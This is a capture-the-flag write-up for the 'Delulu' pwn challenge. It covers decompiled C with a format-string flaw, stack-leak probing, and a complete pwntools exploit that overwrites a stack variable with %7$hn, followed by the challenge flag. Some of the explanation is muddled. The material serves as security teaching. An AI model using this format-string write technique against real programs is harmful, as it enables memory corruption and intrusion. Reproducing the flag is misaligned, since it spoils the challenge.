# Delulu

HALT! Recognition protocol initiated. Please present your face for scanning.

## Writeup

This is the main function of the binary:

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  long target;
  long *local_40;
  undefined8 buffer;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  target = 0x1337babe;
  local_40 = &target;
  buffer = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&buffer,31);
  printf("\n[!] Checking.. ");
  printf((char *)&buffer);
  if (target == 0x1337beef) {
    delulu();
  }
  else {
    error("ALERT ALERT ALERT ALERT\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

There is a format string on **buffer**.

We can try to print stack variable in order to detect where is the pointer of the variable that we want to change:

```
>> %x.%x.%x.%x.%x.%x.%x

[!] Checking.. e3b6280.0.6314887.10.7fffffff.1337babe.e3b83a0
```

So the target variable contain the value **0x1337babe** and his address by reading the code will be the successive value **0xe3b83a0**.

To check it, just send **%7$s**, because is at the 7th position on the stack and we want to retreive his content:

```
>> %7$s

[!] Checking.. 7
```

The value is **7**, that is the ascii rapresentation of **0x1337babe**

```
>> %7$x.%x.%x.%x.%x.%x.%x.%x 

[!] Checking.. fea970a0.fea94f80.0.8fd14887.10.7fffffff.1337babe.fea970a0
```

We can write in this address using **%c** and pointing into the target variable with **%7$n**.

To write **0x1337beef** value, we can add the integer rappresentation of this address times a char, like this:

```python
payload = f"%{0x1337beef}c%7$n"
```

But if we use this payload the exploit will take some time, so we can send half of chars using the format string **%7$hn**:

```python
payload = f"%{0xbeef}c%7$hn"
```

The final exploit will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 83.136.249.159 --port 44420 delulu
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'delulu')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
if args['LOCAL']:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) # Can be found via $ ldd exe
else:
    libc = ELF('glibc/libc.so.6', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '83.136.249.159'
port = int(args.PORT or 44420)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

io = start()

address = 0xbeef

payload = f"%{address}c%7$hn"

io.sendlineafter(b'>>', payload)

io.interactive()
```

This is the flag:

```
HTB{m45t3r_0f_d3c3pt10n}
```